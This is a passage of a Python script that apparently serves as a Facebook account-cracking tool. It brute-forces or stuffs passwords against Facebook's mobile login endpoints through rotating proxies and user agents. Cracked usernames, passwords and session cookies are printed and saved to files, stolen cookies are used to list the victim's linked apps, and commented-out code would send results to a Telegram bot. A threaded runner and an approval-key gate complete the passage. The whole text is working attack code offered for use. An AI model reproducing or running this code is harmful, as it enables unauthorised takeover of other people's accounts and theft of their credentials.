    sys.stdout.write(f"\r  ARIYAN  {P}{a40} {loop} {a14}{len(id)}{xxh} OK  ࿌  {P}{H}{ok}{a26} CP ࿋    {P}{M}{cp}{P} - {bo}{'{:.0%}'.format(loop/float(len(id)))}  "),
    sys.stdout.flush()
    ua = random.choice(ugen2)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks5://'+nip}
            ses.headers.update = {'Host':'p.facebook.com',
	'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.61"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'referer': 'https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
}
            p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&wtsid=rdr_0h6isQJSJIoku7Q5N&refsrc=deprecated&_rdr').text
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://p.facebook.com/login/save-device/'"}
            ses.headers.update = {'Host': 'm.facebook.com',
	'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.61"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '""',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'referer': 'https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False,proxies=proxs)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\x1b[1;31m{K}-------------[ ARIYAN [☒]  [CP] ]---------------\n\x1b[1;31m[☒] USER : {idf} \n[☒] PASS : {pw} \n[☒] date : [{tahun(idf)}] \n COOKIES : {ua} ')
                open('/sdcard/ARIYAN-CPk.txt','a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
#                requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r{H}-------------[ ARIYAN [☑]  [OK] ]---------------\n[☑] USER : {idf} \n[☑] PASS : {pw} \n[☑] COOKIES : {kuki}')
                print('\033[1;34m════════════════════════════════════════════════════════')
                open('/sdcard/REBA-Ok.txt','a').write(idf+' • '+pw+'\n')
                cek_RAVEN(kuki)
#                requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
#----------------------[ CEK-APLIKASI ]---------------------#
def cek_RAVEN(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m              ➛ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))

# 							[ approval ] 								#
def reg():
    os.system('clear')
    os.system('xdg-open https://www.facebook.com/Ariyan.of.king143')
    banner()
    print ('')
    print ('                  [\033[1;97m\033[1;41m wait a minute \033[0m\033[1;93m]')
    time.sleep(1) 
    try:
        to = open('/sdcard/Android/.mrbx.txt', 'r').read()
    except (KeyError, IOError):
        reg2()
    r = requests.get('https://github.com/ARIYAN-AHMED-143/Tricks/blob/main/Approvel.txt').text
    if to in r:
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('xdg-open https://www.facebook.com/it.is.Masudvai.143')
        banner()
        print('      [\033[1;97m\033[1;41m  YOU NEED APPROVAL    \033[0m\033[1;93m]')
        print ('\n               YOUR KEY : \n' + to)
        print('      [\033[1;97m\033[1;41m  YOUR KEY SENT TO ADDMIN    \033[0m\033[1;93m]')
        name = input("               YOUR NAME : ")
        input('                     [\033[1;97m\033[1;41m  CLICK INTER   \033[0m\033[1;93m]')
        time.sleep(3.5)
        os.system('xdg-open https://m.me/it.is.Masudvai.143')
  
  
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()

Threads=[] 
for t in range(30):
 x = threading.Thread(target=passwrd1)
 x.start()
 Threads.append(x)
for Th in Threads:
 passwrd1()
Threads=[] 
for t in range(30):
 x = threading.Thread(target=password2)
 x.start()
 Threads.append(x)
for Th in Threads:
 password2()